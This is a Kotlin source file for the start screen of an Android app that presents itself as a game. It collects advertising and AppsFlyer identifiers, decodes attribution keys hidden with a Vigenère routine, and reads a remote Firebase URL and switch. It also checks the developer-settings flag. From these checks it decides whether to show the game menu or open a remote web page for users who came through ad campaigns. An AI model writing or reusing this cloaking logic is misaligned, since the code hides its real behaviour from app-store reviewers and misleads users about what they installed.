package com.happyadda.jaleb.ui

import android.content.Context
import android.provider.Settings
import android.util.Log
import android.webkit.URLUtil
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.size
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.runtime.livedata.observeAsState
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.NavController
import androidx.navigation.compose.rememberNavController
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.happyadda.jaleb.R
import com.happyadda.jaleb.data.game.preferences.NigLinkPreferences
import com.happyadda.jaleb.di.NightApplication
import com.happyadda.jaleb.utils.nigCheckInternet
import com.happyadda.jaleb.utils.vigenere
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

@Composable
fun NigInitPage(navController: NavController) {
    val nigInitViewModel: NigInitViewModel = viewModel()
    val nigContext = LocalContext.current
    val nigScope = rememberCoroutineScope()

    val nigAfState = NightApplication.nigAppsFlyerState.observeAsState().value

    val nigPBarVisible = remember { mutableStateOf(true) }
    val nigLinkCollected = remember { mutableStateOf(false) }
    val nigAlertDialogShowed = remember { mutableStateOf(true) }

    val nigLinkPreferences = NigLinkPreferences(nigContext)
    val nigLink = nigLinkPreferences.nigGetLink.collectAsState(initial = "")


    fun nigCollectLink() {
        nigPBarVisible.value = false
        if (nigInitViewModel.checkForOrganic()) {
            navigateToMenuPage(navController)
            return
        }

        nigAfState?.let {
            val nigCollectedLink = nigInitViewModel.nigCollectLink(nigContext)
            if (URLUtil.isValidUrl(nigCollectedLink)) {
            navigateToWebPage(navController, nigCollectedLink)
            nigLinkCollected.value = true
                nigScope.launch {
                    nigLinkPreferences.nigSaveLink(nigCollectedLink)
                }
            }
            Log.d("TAG", "nigCollectLink: $nigCollectedLink")
        }
    }


    fun nigStartFb() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(nigContext) {
            val nigUri = it?.targetUri
            nigInitViewModel.nigSetDeepLink(nigUri)
        }
    }

    fun nigGetGoogleID() {
        val nigID = AdvertisingIdClient.getAdvertisingIdInfo(nigContext).id.toString()
        nigInitViewModel.nigSetGoogleID(nigID)
    }


    fun nigGetAppsFlyerParams() {
        val nigAfId = AppsFlyerLib.getInstance().getAppsFlyerUID(nigContext).toString()
        nigInitViewModel.nigSetAfUserId(nigAfId)

        nigAfState?.let {
            it.forEach { inform ->
                when (inform.key) {
                    "ct_eaaijq".vigenere() -> nigInitViewModel.nigSetAfStatus(inform.value.toString())
                    "eoywaxvl".vigenere() -> nigInitViewModel.nigSetCampaign(inform.value.toString())
                    "osppa_hdsrfh".vigenere() -> nigInitViewModel.nigSetMediaSource(inform.value.toString())
                    "ct_ooacccl".vigenere() -> nigInitViewModel.nigSetAfChannel(inform.value.toString())
                }
            }
            nigCollectLink()
        }
    }

    fun nigBeginWork() = nigScope.launch {
        withContext(Dispatchers.IO) {
            nigStartFb()
            nigGetGoogleID()
        }
        nigGetAppsFlyerParams()
    }

    fun nigInitFirebase(context: Context) {
        val nigSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(2500)
            .build()
        FirebaseRemoteConfig.getInstance().apply {
            setConfigSettingsAsync(nigSettings)
            fetchAndActivate().addOnCompleteListener {
                val nigUrl = getString(context.resources.getString(R.string.firebase_root_url))
                val nigSwitch =
                    getBoolean(context.resources.getString(R.string.firebase_organic))
                nigInitViewModel.setUrlAndOrganic(nigUrl, nigSwitch) { correct ->
                    Log.d("TAG", "nigInitFirebase: $correct")
                    if (correct) {
                        nigBeginWork()
                    } else {
                        navigateToMenuPage(navController)
                    }
                }
            }
        }
    }

    fun initLoading() {
        if (nigCheckInternet(nigContext)) {
            nigPBarVisible.value = true

            if (Settings.Secure.getInt(
                    nigContext.contentResolver,
                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                    0
                ) == 0
            ) {
                navigateToMenuPage(navController)
                return
            }


            if (nigLink.value.isNotBlank()) {
                Log.d("TAG", "initLoading: is not empty")
                navigateToWebPage(navController, nigLink.value)
                nigLinkCollected.value = true
            } else {
                nigInitFirebase(nigContext)
            }
        } else {
            nigPBarVisible.value = false
            nigAlertDialogShowed.value = false
        }
    }

    @Composable
    fun showNigNoInternetDialog() {
        if (!nigAlertDialogShowed.value) {
            AlertDialog(
                onDismissRequest = {},
                title = { Text("No internet connection") },
                text = { Text(text = "Check your internet connection and try again later") },
                confirmButton = {
                    TextButton(onClick = {
                        nigAlertDialogShowed.value = true
                        initLoading()
                    }) {
                        Text("Try again")
                    }
                }
            )
        }
    }

    Surface(
        color = Color.Black,
        modifier = Modifier.fillMaxSize(),
    ) {
        Box(contentAlignment = Alignment.Center) {
            CircularProgressIndicator(
                modifier = Modifier.size(110.dp),
                color = Color.White
            )
        }
    }

    LaunchedEffect(nigLink.value) {
        nigScope.launch {
            if (!nigLinkCollected.value) initLoading()
        }
    }
    LaunchedEffect(nigAfState) {
        nigScope.launch {
            if (!nigLinkCollected.value)nigGetAppsFlyerParams()
        }
    }

    if (!nigAlertDialogShowed.value) {
        showNigNoInternetDialog()
    }
}

fun navigateToWebPage(navController: NavController, nigLink: String) {
    navController.navigate("web?id=$nigLink") {
        popUpTo("init") { inclusive = true }
    }
}

fun navigateToMenuPage(navController: NavController) {
    navController.navigate("menu") {
        popUpTo("init") { inclusive = true }
    }
}

@Preview
@Composable
fun InitPagePreview(navController: NavController = rememberNavController()) {
    NigInitPage(navController)
}